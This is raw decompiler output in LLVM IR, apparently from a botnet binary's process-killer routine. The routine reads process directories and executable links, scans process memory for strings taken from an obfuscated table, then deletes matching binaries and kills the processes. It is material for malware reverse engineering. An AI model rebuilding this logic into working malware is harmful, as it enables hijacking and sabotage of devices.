dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  store i32 %v1_d26c, i32* @r6, align 4
  store i32 %v1_d26c, i32* @r0, align 4
  %v1_d284 = call i32 @atol(i32 %v1_d26c)
  %v0_d28c = load i32, i32* @r5, align 4
  %v1_d290 = add i32 %stack_var_-8436.2, 1
  store i32 %v1_d290, i32* %r1.global-to-local, align 4
  store i32 %v1_d284, i32* @r7, align 4
  %v5_d29c = icmp slt i32 %v0_d28c, %v1_d284
  %v2_d30c = call i32 @__GI_time(i32* null)
  br i1 %v5_d29c, label %dec_label_pc_d308, label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d27c
  %v0_d2a8 = load i32, i32* @r4, align 4
  %v2_d2a8 = sub i32 %v2_d30c, %v0_d2a8
  %v7_d2b0 = icmp slt i32 %v2_d2a8, 601
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2a0
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2a0
  %v0_d2b8 = load i32, i32* @r7, align 4
  %v7_d2bc = icmp slt i32 %v0_d2b8, 401
  br i1 %v7_d2bc, label %dec_label_pc_d25c.backedge, label %dec_label_pc_d2c0

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2b8
  %v3_d2c8 = zext i32 %v1_d290 to i64
  %v4_d2c8 = mul nuw i64 %v3_d2c8, 3435973837
  %v3_d2cc1 = udiv i64 %v4_d2c8, 34359738368
  %v3_d2d03 = mul nuw nsw i64 %v3_d2cc1, 8
  %v3_d2d0 = trunc i64 %v3_d2d03 to i32
  store i32 %v3_d2d0, i32* %r3.global-to-local, align 4
  %v2_d2d45 = mul nuw nsw i64 %v3_d2cc1, 2
  %v2_d2d4 = trunc i64 %v2_d2d45 to i32
  %v2_d2d8 = add i32 %v3_d2d0, %v2_d2d4
  store i32 %v2_d2d8, i32* %r2.global-to-local, align 4
  %v9_d2dc = icmp eq i32 %v1_d290, %v2_d2d8
  br i1 %v9_d2dc, label %dec_label_pc_d2e4, label %dec_label_pc_d25c.backedge

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2c0
  %v1_d2e8 = call i32 @sleep(i32 1)
  %v0_d2ec = load i32, i32* @r8, align 4
  %v1_d2f0 = inttoptr i32 %v0_d2ec to i32*
  %v2_d2f0 = call i32 @__GI_readdir(i32* %v1_d2f0)
  %v2_d2f4 = icmp eq i32 %v2_d2f0, 0
  br i1 %v2_d2f4, label %dec_label_pc_d2fc, label %dec_label_pc_d26c

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d25c.backedge, %dec_label_pc_d2e4, %dec_label_pc_d254
  %stack_var_-8436.3 = phi i32 [ %stack_var_-8436.0, %dec_label_pc_d254 ], [ %v1_d290, %dec_label_pc_d2e4 ], [ %stack_var_-8436.1.be, %dec_label_pc_d25c.backedge ]
  %v0_d2fc = load i32, i32* @r8, align 4
  %v1_d300 = inttoptr i32 %v0_d2fc to i32*
  %v2_d300 = call i32 @__GI_closedir(i32* %v1_d300)
  br label %dec_label_pc_d234

dec_label_pc_d308:                                ; preds = %dec_label_pc_d27c
  %v1_d318 = call i32 @table_unlock_val(i32 15)
  %v1_d320 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d32c = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_d334, i32* @fp, align 4
  store i32 %v3_d32c, i32* %r1.global-to-local, align 4
  store i32 %v2_d334, i32* @r0, align 4
  %v3_d340 = call i32 @util_strcpy(i8* %v2_d340, i32 %v3_d32c)
  %v1_d344 = load i32, i32* @fp, align 4
  %v2_d344 = add i32 %v1_d344, %v3_d340
  store i32 %v2_d344, i32* %r5.global-to-local, align 4
  %v0_d348 = load i32, i32* @r6, align 4
  store i32 %v0_d348, i32* %r1.global-to-local, align 4
  store i32 %v2_d344, i32* @r0, align 4
  %v2_d350 = inttoptr i32 %v2_d344 to i8*
  %v3_d350 = call i32 @util_strcpy(i8* %v2_d350, i32 %v0_d348)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d350, i32* %r4.global-to-local, align 4
  %v3_d360 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d360, i32* %r1.global-to-local, align 4
  %v1_d368 = load i32, i32* %r5.global-to-local, align 4
  %v2_d368 = add i32 %v1_d368, %v3_d350
  store i32 %v2_d368, i32* @r0, align 4
  %v2_d36c = inttoptr i32 %v2_d368 to i8*
  %v3_d36c = call i32 @util_strcpy(i8* %v2_d36c, i32 %v3_d360)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  store i32 %v2_d384, i32* @r0, align 4
  %v3_d388 = call i32 @util_strcpy(i8* %v2_d388, i32 %v3_d378)
  %v2_d394 = add i32 %v3_d388, %v2_d384
  store i32 %v2_d394, i32* @r5, align 4
  store i32 %v2_d394, i32* @r0, align 4
  %v0_d39c = load i32, i32* @r6, align 4
  store i32 %v0_d39c, i32* %r1.global-to-local, align 4
  %v2_d3a0 = inttoptr i32 %v2_d394 to i8*
  %v3_d3a0 = call i32 @util_strcpy(i8* %v2_d3a0, i32 %v0_d39c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3a0, i32* @r4, align 4
  %v3_d3b0 = call i32 @table_retrieve_val(i32 34, i32* null)
  store i32 %v3_d3b0, i32* %r1.global-to-local, align 4
  %v0_d3b8 = load i32, i32* @r4, align 4
  %v1_d3b8 = load i32, i32* @r5, align 4
  %v2_d3b8 = add i32 %v1_d3b8, %v0_d3b8
  store i32 %v2_d3b8, i32* @r0, align 4
  %v2_d3bc = inttoptr i32 %v2_d3b8 to i8*
  %v3_d3bc = call i32 @util_strcpy(i8* %v2_d3bc, i32 %v3_d3b0)
  %v1_d3c4 = call i32 @table_lock_val(i32 15)
  %v1_d3cc = call i32 @table_lock_val(i32 16)
  store i32 %v1_d16c, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d3e0 = call i32 @readlink(i32 %v2_d334, i32 %v1_d16c, i32 4095)
  %v7_d3e4 = icmp eq i32 %v3_d3e0, -1
  store i32 %v3_d3e0, i32* @r5, align 4
  br i1 %v7_d3e4, label %dec_label_pc_d4a8, label %dec_label_pc_d3f0

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d308
  store i32 %v1_d16c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d3f8 = add i32 %v3_d3e0, %v1_d16c
  %v5_d3f8 = inttoptr i32 %v4_d3f8 to i8*
  store i8 0, i8* %v5_d3f8, align 1
  %v1_d400 = call i32 @table_unlock_val(i32 35)
  %v0_d404 = load i32, i32* @r4, align 4
  store i32 %v0_d404, i32* %r1.global-to-local, align 4
  %v2_d40c = inttoptr i32 %v0_d404 to i32*
  %v3_d40c = call i32 @table_retrieve_val(i32 35, i32* %v2_d40c)
  %v0_d410 = load i32, i32* @r5, align 4
  %v1_d410 = add i32 %v0_d410, -1
  store i32 %v1_d410, i32* @r1, align 4
  store i32 %v3_d40c, i32* %r2.global-to-local, align 4
  %v4_d41c = call i32 @util_stristr(i8* %v2_d17c, i32 %v1_d410, i32 %v3_d40c)
  %v7_d420 = icmp eq i32 %v4_d41c, -1
  br i1 %v7_d420, label %dec_label_pc_d43c, label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d3f0
  %v1_d42c = call i32 @unlink(i32 %v1_d16c)
  %v0_d430 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d438 = call i32 @kill(i32 %v0_d430, i32 9)
  br label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d3f0, %dec_label_pc_d428
  %v1_d440 = call i32 @table_lock_val(i32 35)
  %v1_d444 = call i32 @__getpid(i32 %v1_d440)
  store i32 %v1_d444, i32* @r0, align 4
  %v1_d448 = load i32, i32* @r7, align 4
  %v9_d448 = icmp eq i32 %v1_d444, %v1_d448
  br i1 %v9_d448, label %dec_label_pc_d474, label %dec_label_pc_d450

dec_label_pc_d450:                                ; preds = %dec_label_pc_d43c
  %v0_d450 = call i32 @getppid()
  %v1_d454 = load i32, i32* @r7, align 4
  %v9_d454 = icmp eq i32 %v0_d450, %v1_d454
  br i1 %v9_d454, label %dec_label_pc_d474, label %dec_label_pc_d45c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d450
  store i32 ptrtoint (i32* @global_var_24f44.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d464 = load i32, i32* @global_var_24f44.79, align 4
  store i32 %v2_d464, i32* %r1.global-to-local, align 4
  %v3_d468 = call i32 @util_strcmp(i8* %v2_d17c, i32 %v2_d464)
  %v2_d46c = icmp eq i32 %v3_d468, 0
  br i1 %v2_d46c, label %dec_label_pc_d480, label %dec_label_pc_d45c.dec_label_pc_d474_crit_edge

dec_label_pc_d45c.dec_label_pc_d474_crit_edge:    ; preds = %dec_label_pc_d45c
  %v0_d478.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d45c.dec_label_pc_d474_crit_edge, %dec_label_pc_d450, %dec_label_pc_d43c
  %v0_d478 = phi i32 [ %v0_d478.pre, %dec_label_pc_d45c.dec_label_pc_d474_crit_edge ], [ %v0_d450, %dec_label_pc_d450 ], [ %v1_d444, %dec_label_pc_d43c ]
  store i32 %v2_d30c, i32* @r4, align 4
  store i32 %v0_d478, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d25c.backedge:                       ; preds = %dec_label_pc_d2c0, %dec_label_pc_d2b8, %dec_label_pc_d26c, %dec_label_pc_d474, %dec_label_pc_d7ac, %.thread10
  %stack_var_-8436.1.be = phi i32 [ %v1_d290, %dec_label_pc_d7ac ], [ %v1_d290, %dec_label_pc_d474 ], [ %v1_d290, %.thread10 ], [ %stack_var_-8436.2, %dec_label_pc_d26c ], [ %v1_d290, %dec_label_pc_d2b8 ], [ %v1_d290, %dec_label_pc_d2c0 ]
  %v0_d25c = load i32, i32* @r8, align 4
  %v1_d260 = inttoptr i32 %v0_d25c to i32*
  %v2_d260 = call i32 @__GI_readdir(i32* %v1_d260)
  %v2_d264 = icmp eq i32 %v2_d260, 0
  br i1 %v2_d264, label %dec_label_pc_d2fc, label %dec_label_pc_d26c.preheader

dec_label_pc_d480:                                ; preds = %dec_label_pc_d45c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d488 = call i32 @__libc_open(i32 %v1_d16c, i32 0)
  %v7_d48c = icmp eq i32 %v2_d488, -1
  store i32 %v2_d488, i32* @r4, align 4
  br i1 %v7_d48c, label %bb255, label %.thread12

bb255:                                            ; preds = %dec_label_pc_d480
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d480, %bb255
  store i32 ptrtoint (i32* @global_var_d4a0.82 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d48c, i32 ptrtoint (i32* @global_var_11468.81 to i32))
  %v0_d4a0 = load i32, i32* @r4, align 4
  %v1_d4a4 = call i32 @__GI___libc_close(i32 %v0_d4a0)
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d308, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4b0 = call i32 @__libc_open(i32 %v2_d334, i32 0)
  %v7_d4b4 = icmp eq i32 %v2_d4b0, -1
  br i1 %v7_d4b4, label %dec_label_pc_d7ac, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4a8
  %v1_d4c4 = call i32 @table_unlock_val(i32 20)
  %v1_d4cc = call i32 @table_unlock_val(i32 21)
  %v1_d4d4 = call i32 @table_unlock_val(i32 22)
  %v1_d4dc = call i32 @table_unlock_val(i32 23)
  %v1_d4e4 = call i32 @table_unlock_val(i32 24)
  %v1_d4ec = call i32 @table_unlock_val(i32 36)
  store i32 %v2_d4f4, i32* %r1.global-to-local, align 4
  %v3_d4fc = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 %v3_d4fc, i32* @r6, align 4
  %v3_d510 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v2_d518, i32* %r1.global-to-local, align 4
  store i32 %v3_d510, i32* @sl, align 4
  %v3_d524 = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v2_d52c, i32* %r1.global-to-local, align 4
  store i32 %v3_d524, i32* @sb, align 4
  %v3_d538 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v2_d544, i32* %r1.global-to-local, align 4
  %v3_d54c = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v2_d53c, i32* %r1.global-to-local, align 4
  %v3_d55c = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-64)
  store i32 %v2_d568, i32* @r4, align 4
  store i32 %v2_d568, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d578136 = call i32 @__libc_read(i32 %v2_d4b0)
  %tmp256 = icmp slt i32 %v1_d578136, 1
  br i1 %tmp256, label %dec_label_pc_d7dc, label %dec_label_pc_d584

dec_label_pc_d584:                                ; preds = %dec_label_pc_d4c0, %dec_label_pc_d56c.backedge
  %v0_d628127 = phi i32 [ %v1_d578, %dec_label_pc_d56c.backedge ], [ %v1_d578136, %dec_label_pc_d4c0 ]
  %v3_d588 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d588, i32* @r5, align 4
  %v5_d590 = icmp slt i32 %v0_d628127, %v3_d588
  br i1 %v5_d590, label %dec_label_pc_d5a0, label %dec_label_pc_d668.lr.ph

dec_label_pc_d668.lr.ph:                          ; preds = %dec_label_pc_d584
  %v1_d66083 = add i32 %v0_d628127, -1
  store i32 %v1_d66083, i32* %r1.global-to-local, align 4
  %v0_d668.pre = load i32, i32* @r6, align 4
  %v1_d66c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d668

dec_label_pc_d5a0:                                ; preds = %dec_label_pc_d660.backedge, %dec_label_pc_d584
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d5a4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d5a4, i32* @r5, align 4
  %v5_d5ac = icmp slt i32 %v0_d628127, %v3_d5a4
  br i1 %v5_d5ac, label %dec_label_pc_d5bc, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d5a0
  %v1_d69492 = add i32 %v0_d628127, -1
  store i32 %v1_d69492, i32* %r1.global-to-local, align 4
  %v2_d69493 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d69493, label %dec_label_pc_d5bc, label %dec_label_pc_d69c.lr.ph

dec_label_pc_d69c.lr.ph:                          ; preds = %.thread28
  %v0_d69c.pre = load i32, i32* @sl, align 4
  %v1_d6a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d69c

dec_label_pc_d5bc:                                ; preds = %dec_label_pc_d694.backedge, %.thread28, %dec_label_pc_d5a0
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d5c0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d5c0, i32* @r5, align 4
  %v5_d5c8 = icmp slt i32 %v0_d628127, %v3_d5c0
  br i1 %v5_d5c8, label %dec_label_pc_d5d8, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_d5bc
  %v1_d6c8101 = add i32 %v0_d628127, -1
  store i32 %v1_d6c8101, i32* %r1.global-to-local, align 4
  %v2_d6c8102 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d6c8102, label %dec_label_pc_d5d8, label %dec_label_pc_d6d0.lr.ph

dec_label_pc_d6d0.lr.ph:                          ; preds = %.thread37
  %v0_d6d0.pre = load i32, i32* @sb, align 4
  %v1_d6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6d0

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d6c8.backedge, %.thread37, %dec_label_pc_d5bc
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d5dc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_d5dc, i32* @r5, align 4
  %v5_d5e4 = icmp slt i32 %v0_d628127, %v3_d5dc
  br i1 %v5_d5e4, label %dec_label_pc_d5f4, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_d5d8
  %v1_d6fc110 = add i32 %v0_d628127, -1
  store i32 %v1_d6fc110, i32* %r1.global-to-local, align 4
  %v2_d6fc111 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d6fc111, label %dec_label_pc_d5f4, label %dec_label_pc_d704.lr.ph

dec_label_pc_d704.lr.ph:                          ; preds = %.thread46
  %v1_d70c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d704

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d6fc.backedge, %.thread46, %dec_label_pc_d5d8
  %v3_d5f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d5f8, i32* @r5, align 4
  %v5_d600 = icmp slt i32 %v0_d628127, %v3_d5f8
  br i1 %v5_d600, label %dec_label_pc_d610, label %.thread55

.thread55:                                        ; preds = %dec_label_pc_d5f4
  %v1_d734119 = add i32 %v0_d628127, -1
  store i32 %v1_d734119, i32* %r1.global-to-local, align 4
  %v2_d734120 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d734120, label %dec_label_pc_d610, label %dec_label_pc_d73c.lr.ph

dec_label_pc_d73c.lr.ph:                          ; preds = %.thread55
  %v1_d744.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d73c

dec_label_pc_d610:                                ; preds = %dec_label_pc_d734.backedge, %.thread55, %dec_label_pc_d5f4
  %v3_d614 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d614, i32* @lr, align 4
  %v5_d61c = icmp slt i32 %v0_d628127, %v3_d614
  br i1 %v5_d61c, label %dec_label_pc_d56c.backedge, label %.thread61

dec_label_pc_d56c.backedge:                       ; preds = %dec_label_pc_d648, %.thread61, %dec_label_pc_d610
  store i32 %v2_d568, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d578 = call i32 @__libc_read(i32 %v2_d4b0)
  %tmp257 = icmp slt i32 %v1_d578, 1
  br i1 %tmp257, label %dec_label_pc_d7dc, label %dec_label_pc_d584

.thread61:                                        ; preds = %dec_label_pc_d610
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d628129 = icmp eq i32 %v0_d628127, 0
  br i1 %v2_d628129, label %dec_label_pc_d56c.backedge, label %dec_label_pc_d630.lr.ph

dec_label_pc_d630.lr.ph:                          ; preds = %.thread61
  %v1_d638.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %dec_label_pc_d648, %dec_label_pc_d630.lr.ph
  %v0_d628.in = phi i32 [ %v0_d628127, %dec_label_pc_d630.lr.ph ], [ %v0_d628, %dec_label_pc_d648 ]
  %v0_d648 = phi i32 [ 0, %dec_label_pc_d630.lr.ph ], [ %v1_d648, %dec_label_pc_d648 ]
  %v1_d634 = phi i32 [ 0, %dec_label_pc_d630.lr.ph ], [ %v1_d634202, %dec_label_pc_d648 ]
  %v0_d628 = add i32 %v0_d628.in, -1
  store i32 %v3_d55c, i32* %r3.global-to-local, align 4
  %v2_d634 = add i32 %v1_d634, %v3_d55c
  %v3_d634 = inttoptr i32 %v2_d634 to i8*
  %v4_d634 = load i8, i8* %v3_d634, align 1
  %v6_d634 = zext i8 %v4_d634 to i32
  store i32 %v6_d634, i32* %r2.global-to-local, align 4
  %v2_d638 = add i32 %v0_d648, %v1_d638.pre
  %v3_d638 = inttoptr i32 %v2_d638 to i8*
  %v4_d638 = load i8, i8* %v3_d638, align 1
  %v6_d638 = zext i8 %v4_d638 to i32
  store i32 %v6_d638, i32* @r3, align 4
  %v9_d63c = icmp eq i8 %v4_d638, %v4_d634
  br i1 %v9_d63c, label %dec_label_pc_d75c, label %bb258

bb258:                                            ; preds = %dec_label_pc_d630
  br label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %bb258, %dec_label_pc_d75c
  %v1_d634202 = phi i32 [ %v1_d75c, %dec_label_pc_d75c ], [ 0, %bb258 ]
  %v1_d648 = add i32 %v0_d648, 1
  store i32 %v1_d648, i32* %r1.global-to-local, align 4
  %v2_d628 = icmp eq i32 %v0_d628, 0
  br i1 %v2_d628, label %dec_label_pc_d56c.backedge, label %dec_label_pc_d630

dec_label_pc_d650:                                ; preds = %dec_label_pc_d668
  %v1_d650 = add i32 %v1_d668, 1
  store i32 %v1_d650, i32* @lr, align 4
  %v9_d654 = icmp eq i32 %v3_d588, %v1_d650
  br i1 %v9_d654, label %dec_label_pc_d768, label %dec_label_pc_d660.backedge

dec_label_pc_d660.backedge:                       ; preds = %dec_label_pc_d650, %dec_label_pc_d67c
  %v1_d668160 = phi i32 [ 0, %dec_label_pc_d67c ], [ %v1_d650, %dec_label_pc_d650 ]
  %storemerge148 = add i32 %storemerge148.in, 1
  %v1_d660 = add i32 %v0_d660, -1
  store i32 %v1_d660, i32* %r1.global-to-local, align 4
  %v2_d660 = icmp eq i32 %v0_d660, 0
  br i1 %v2_d660, label %dec_label_pc_d5a0, label %dec_label_pc_d668

dec_label_pc_d668:                                ; preds = %dec_label_pc_d660.backedge, %dec_label_pc_d668.lr.ph
  %v0_d660 = phi i32 [ %v1_d66083, %dec_label_pc_d668.lr.ph ], [ %v1_d660, %dec_label_pc_d660.backedge ]
  %storemerge148.in = phi i32 [ 0, %dec_label_pc_d668.lr.ph ], [ %storemerge148, %dec_label_pc_d660.backedge ]
  %v1_d668 = phi i32 [ 0, %dec_label_pc_d668.lr.ph ], [ %v1_d668160, %dec_label_pc_d660.backedge ]
  %v2_d668 = add i32 %v1_d668, %v0_d668.pre
  %v3_d668 = inttoptr i32 %v2_d668 to i8*
  %v4_d668 = load i8, i8* %v3_d668, align 1
  %v6_d668 = zext i8 %v4_d668 to i32
  store i32 %v6_d668, i32* %r2.global-to-local, align 4
  %v2_d66c = add i32 %storemerge148.in, %v1_d66c.pre
  %v3_d66c = inttoptr i32 %v2_d66c to i8*
  %v4_d66c = load i8, i8* %v3_d66c, align 1
  %v6_d66c = zext i8 %v4_d66c to i32
  store i32 %v6_d66c, i32* %r3.global-to-local, align 4
  %v9_d670 = icmp eq i8 %v4_d66c, %v4_d668
  br i1 %v9_d670, label %dec_label_pc_d650, label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d668
  br label %dec_label_pc_d660.backedge

dec_label_pc_d684:                                ; preds = %dec_label_pc_d69c
  %v1_d684 = add i32 %v1_d69c, 1
  store i32 %v1_d684, i32* @lr, align 4
  %v9_d688 = icmp eq i32 %v3_d5a4, %v1_d684
  br i1 %v9_d688, label %dec_label_pc_d768, label %dec_label_pc_d694.backedge

dec_label_pc_d694.backedge:                       ; preds = %dec_label_pc_d684, %dec_label_pc_d6b0
  %v1_d69c169 = phi i32 [ 0, %dec_label_pc_d6b0 ], [ %v1_d684, %dec_label_pc_d684 ]
  %storemerge147 = add i32 %storemerge147.in, 1
  %v1_d694 = add i32 %v0_d694, -1
  store i32 %v1_d694, i32* %r1.global-to-local, align 4
  %v2_d694 = icmp eq i32 %v0_d694, 0
  br i1 %v2_d694, label %dec_label_pc_d5bc, label %dec_label_pc_d69c

dec_label_pc_d69c:                                ; preds = %dec_label_pc_d694.backedge, %dec_label_pc_d69c.lr.ph
  %v0_d694 = phi i32 [ %v1_d69492, %dec_label_pc_d69c.lr.ph ], [ %v1_d694, %dec_label_pc_d694.backedge ]
  %storemerge147.in = phi i32 [ 0, %dec_label_pc_d69c.lr.ph ], [ %storemerge147, %dec_label_pc_d694.backedge ]
  %v1_d69c = phi i32 [ 0, %dec_label_pc_d69c.lr.ph ], [ %v1_d69c169, %dec_label_pc_d694.backedge ]
  %v2_d69c = add i32 %v1_d69c, %v0_d69c.pre
  %v3_d69c = inttoptr i32 %v2_d69c to i8*
  %v4_d69c = load i8, i8* %v3_d69c, align 1
  %v6_d69c = zext i8 %v4_d69c to i32
  store i32 %v6_d69c, i32* %r2.global-to-local, align 4
  %v2_d6a0 = add i32 %storemerge147.in, %v1_d6a0.pre
  %v3_d6a0 = inttoptr i32 %v2_d6a0 to i8*
  %v4_d6a0 = load i8, i8* %v3_d6a0, align 1
  %v6_d6a0 = zext i8 %v4_d6a0 to i32
  store i32 %v6_d6a0, i32* %r3.global-to-local, align 4
  %v9_d6a4 = icmp eq i8 %v4_d6a0, %v4_d69c
  br i1 %v9_d6a4, label %dec_label_pc_d684, label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d69c
  br label %dec_label_pc_d694.backedge

dec_label_pc_d6b8:                                ; preds = %dec_label_pc_d6d0
  %v1_d6b8 = add i32 %v1_d6d0, 1
  store i32 %v1_d6b8, i32* @lr, align 4
  %v9_d6bc = icmp eq i32 %v3_d5c0, %v1_d6b8
  br i1 %v9_d6bc, label %dec_label_pc_d768, label %dec_label_pc_d6c8.backedge

dec_label_pc_d6c8.backedge:                       ; preds = %dec_label_pc_d6b8, %dec_label_pc_d6e4
  %v1_d6d0178 = phi i32 [ 0, %dec_label_pc_d6e4 ], [ %v1_d6b8, %dec_label_pc_d6b8 ]
  %storemerge146 = add i32 %storemerge146.in, 1
  %v1_d6c8 = add i32 %v0_d6c8, -1
  store i32 %v1_d6c8, i32* %r1.global-to-local, align 4
  %v2_d6c8 = icmp eq i32 %v0_d6c8, 0
  br i1 %v2_d6c8, label %dec_label_pc_d5d8, label %dec_label_pc_d6d0

dec_label_pc_d6d0:                                ; preds = %dec_label_pc_d6c8.backedge, %dec_label_pc_d6d0.lr.ph
  %v0_d6c8 = phi i32 [ %v1_d6c8101, %dec_label_pc_d6d0.lr.ph ], [ %v1_d6c8, %dec_label_pc_d6c8.backedge ]
  %storemerge146.in = phi i32 [ 0, %dec_label_pc_d6d0.lr.ph ], [ %storemerge146, %dec_label_pc_d6c8.backedge ]
  %v1_d6d0 = phi i32 [ 0, %dec_label_pc_d6d0.lr.ph ], [ %v1_d6d0178, %dec_label_pc_d6c8.backedge ]
  %v2_d6d0 = add i32 %v1_d6d0, %v0_d6d0.pre
  %v3_d6d0 = inttoptr i32 %v2_d6d0 to i8*
  %v4_d6d0 = load i8, i8* %v3_d6d0, align 1
  %v6_d6d0 = zext i8 %v4_d6d0 to i32
  store i32 %v6_d6d0, i32* %r2.global-to-local, align 4
  %v2_d6d4 = add i32 %storemerge146.in, %v1_d6d4.pre
  %v3_d6d4 = inttoptr i32 %v2_d6d4 to i8*
  %v4_d6d4 = load i8, i8* %v3_d6d4, align 1
  %v6_d6d4 = zext i8 %v4_d6d4 to i32
  store i32 %v6_d6d4, i32* %r3.global-to-local, align 4
  %v9_d6d8 = icmp eq i8 %v4_d6d4, %v4_d6d0
  br i1 %v9_d6d8, label %dec_label_pc_d6b8, label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6d0
  br label %dec_label_pc_d6c8.backedge

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d704
  %v1_d6ec = add i32 %v1_d708, 1
  store i32 %v1_d6ec, i32* @lr, align 4
  %v9_d6f0 = icmp eq i32 %v3_d5dc, %v1_d6ec
  br i1 %v9_d6f0, label %dec_label_pc_d768, label %dec_label_pc_d6fc.backedge

dec_label_pc_d6fc.backedge:                       ; preds = %dec_label_pc_d6ec, %dec_label_pc_d71c
  %v1_d708186 = phi i32 [ 0, %dec_label_pc_d71c ], [ %v1_d6ec, %dec_label_pc_d6ec ]
  %storemerge145 = add i32 %storemerge145.in, 1
  %v1_d6fc = add i32 %v0_d6fc, -1
  store i32 %v1_d6fc, i32* %r1.global-to-local, align 4
  %v2_d6fc = icmp eq i32 %v0_d6fc, 0
  br i1 %v2_d6fc, label %dec_label_pc_d5f4, label %dec_label_pc_d704

dec_label_pc_d704:                                ; preds = %dec_label_pc_d6fc.backedge, %dec_label_pc_d704.lr.ph
  %v0_d6fc = phi i32 [ %v1_d6fc110, %dec_label_pc_d704.lr.ph ], [ %v1_d6fc, %dec_label_pc_d6fc.backedge ]
  %storemerge145.in = phi i32 [ 0, %dec_label_pc_d704.lr.ph ], [ %storemerge145, %dec_label_pc_d6fc.backedge ]
  %v1_d708 = phi i32 [ 0, %dec_label_pc_d704.lr.ph ], [ %v1_d708186, %dec_label_pc_d6fc.backedge ]
  store i32 %v3_d538, i32* %r3.global-to-local, align 4
  %v2_d708 = add i32 %v1_d708, %v3_d538
  %v3_d708 = inttoptr i32 %v2_d708 to i8*
  %v4_d708 = load i8, i8* %v3_d708, align 1
  %v6_d708 = zext i8 %v4_d708 to i32
  store i32 %v6_d708, i32* %r2.global-to-local, align 4
  %v2_d70c = add i32 %storemerge145.in, %v1_d70c.pre
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  %v4_d70c = load i8, i8* %v3_d70c, align 1
  %v6_d70c = zext i8 %v4_d70c to i32
  store i32 %v6_d70c, i32* @r3, align 4
  %v9_d710 = icmp eq i8 %v4_d70c, %v4_d708
  br i1 %v9_d710, label %dec_label_pc_d6ec, label %dec_label_pc_d71c

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d704
  br label %dec_label_pc_d6fc.backedge

